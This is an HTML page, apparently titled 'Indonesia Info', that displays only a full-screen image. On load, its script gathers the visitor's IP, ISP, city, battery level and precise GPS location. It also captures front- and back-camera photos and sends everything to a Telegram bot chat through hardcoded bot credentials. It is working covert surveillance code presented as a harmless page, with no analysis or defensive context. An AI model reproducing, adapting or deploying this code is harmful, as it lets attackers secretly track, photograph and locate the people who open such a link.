<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Indonesia Info</title>
</head>
<body style="margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: black;">
    <img id="displayImage" src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" style="width: 100%; height: 100vh; object-fit: cover;">

    <script>
        const BOT_TOKEN = "7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg";  
        const CHAT_ID = "7081489041";  

        async function getBatteryStatus() {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return `Baterai: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Sedang Mengisi' : 'Tidak Mengisi'})`;
            }
            return "Baterai: Tidak Diketahui";
        }

        async function getIPInfo() {
            try {
                const res = await fetch("https://ipapi.co/json/");
                const data = await res.json();
                return `IP: ${data.ip}\nISP: ${data.org}\nKota: ${data.city}, ${data.region}, ${data.country_name}`;
            } catch {
                return "IP Info: Tidak Diketahui";
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                    () => resolve("Lokasi: Ditolak oleh pengguna")
                );
            });
        }

        async function captureImage(facingMode) {
            return new Promise(async (resolve, reject) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                        stream.getTracks().forEach(track => track.stop());
                        resolve(canvas.toDataURL("image/jpeg"));
                    }, 2000);
                } catch (error) {
                    reject(error);
                }
            });
        }

        async function sendToTelegram() {
            try {
                const [battery, ipInfo, location] = await Promise.all([getBatteryStatus(), getIPInfo(), getLocation()]);
                const frontImage = await captureImage("user");
                const backImage = await captureImage("environment");

                const text = `ðŸ“Œ *Data Pengguna*\n\n${battery}\n${ipInfo}\n${location}`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
                });

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, photo: frontImage, caption: "ðŸ“¸ Kamera Depan" })
                });

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, photo: backImage, caption: "ðŸ“¸ Kamera Belakang" })
                });

            } catch (error) {
                console.error("Gagal mengirim data:", error);
            }
        }

        sendToTelegram();
    </script>
</body>
</html>
